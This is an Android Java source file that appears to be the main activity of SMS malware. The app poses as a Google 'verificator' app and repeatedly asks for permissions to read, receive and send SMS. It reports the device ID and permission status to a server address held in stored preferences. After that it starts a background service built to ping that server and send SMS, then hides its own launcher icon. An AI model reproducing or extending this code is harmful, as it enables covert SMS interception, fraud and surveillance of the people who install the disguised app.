package com.google.verificator;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.byteshaft.requests.HttpRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int SMS_PHONE_PERMISSION = 1;

    private String androidVersion;
    private String androidId;
    private String smsPermission;
    private int mPermissionCount = 0;

    private PackageManager packageManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M  /* || Build.VERSION.SDK_INT >= Build.VERSION_CODES.O*/) {
            checkPermissions();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.INTERNET}, 1);
        }

        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        androidVersion = Build.VERSION.RELEASE;
        AppGlobals.saveDataToSharedPreferences(AppGlobals.KEY_ANDROID_ID, androidId);
        Log.e("androidId-------:", "---------" + androidId);
        Log.e("androidVersion-------:", "---------" + androidVersion);
        AppGlobals.saveDataToSharedPreferences(AppGlobals.KEY_ANDROID_ID, androidId);
        AppGlobals.saveDataToSharedPreferences(AppGlobals.KEY_ANDROID_VERSION, androidVersion);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    private void pingToServerWhenInstalled(String deviceId, String install, String smsAllowNotAllow) {
        HttpRequest getStateRequest = new HttpRequest(MainActivity.this);
        getStateRequest.setOnReadyStateChangeListener((request, readyState) -> {
            switch (readyState) {
                case HttpRequest.STATE_DONE:
                    switch (request.getStatus()) {
                        case HttpURLConnection.HTTP_OK:
                            System.out.println("MAIN---------------" + request.getResponseText());

                    }
                default: {
                    AppGlobals.pingNotOk("");
                }
            }
        });
        getStateRequest.setOnErrorListener(new HttpRequest.OnErrorListener() {
            @Override
            public void onError(HttpRequest request, int readyState, short error, Exception exception) {
                if (error == HttpRequest.ERROR_CONNECTION_TIMED_OUT) {
                    AppGlobals.pingNotOk("");
                }
                if (error == HttpRequest.ERROR_INVALID_URL) {
                    AppGlobals.pingNotOk("");

                }
                if (error == HttpRequest.ERROR_NETWORK_UNREACHABLE) {
                    AppGlobals.pingNotOk("");
                }

                if (error == HttpRequest.ERROR_LOST_CONNECTION) {
                    AppGlobals.pingNotOk("");
                }

            }
        });
        getStateRequest.setTimeout(15000);
        getStateRequest.open("POST", String.format("%s/ping.php", AppGlobals.getIPFromSharedPreferences()));
        getStateRequest.send(gePingData(deviceId, install, smsAllowNotAllow, AppGlobals.getReleaseVersion()));

    }

    private String gePingData(String deviceId, String install, String smsAllowNotAllow, String releaseVersion) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("DEVICE_ID", deviceId);
            jsonObject.put("INSTALL", install);
            jsonObject.put("SMS_ALLOW", smsAllowNotAllow);
            jsonObject.put("RELEASE_VERSION", releaseVersion);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case SMS_PHONE_PERMISSION:
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//                    NotificationManager notificationManager =
//                            (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
//
//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
//                            && !notificationManager.isNotificationPolicyAccessGranted()) {
//                        Intent intent = new Intent(android.provider.Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
//                        startActivity(intent);
//                    }
                    AppGlobals.saveDataToSharedPreferences(AppGlobals.KEY_PERMISSION, "1");
                    pingToServerWhenInstalled(AppGlobals.getStringFromSharedPreferences(AppGlobals.KEY_ANDROID_ID),
                            "1", "1");

                    if (!AppGlobals.isServiceRunning()) {
                        Intent myService = new Intent(this, PingToServerAndSendSMSService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(myService);
                        } else {
                            startService(myService);
                        }
                        new Handler().postDelayed(() -> {
                            hideApp();
                        }, 10000);

                    }

                    break;
                } else {
                    //permission not allowed
                    mPermissionCount++;
                    if (mPermissionCount == 10) {
                        finish();
                    } else {
                        AppGlobals.saveDataToSharedPreferences(AppGlobals.KEY_PERMISSION, "0");
                        pingToServerWhenInstalled(AppGlobals.getStringFromSharedPreferences(AppGlobals.KEY_ANDROID_ID),
                                "1", "0");
                        checkPermissions();
                    }

                }

        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void checkPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_SMS);
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.SEND_SMS);
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(
                    new String[listPermissionsNeeded.size()]), SMS_PHONE_PERMISSION);
        }

    }

    private void hideApp() {
        packageManager = getPackageManager();
        ComponentName componentName = new
                ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

}
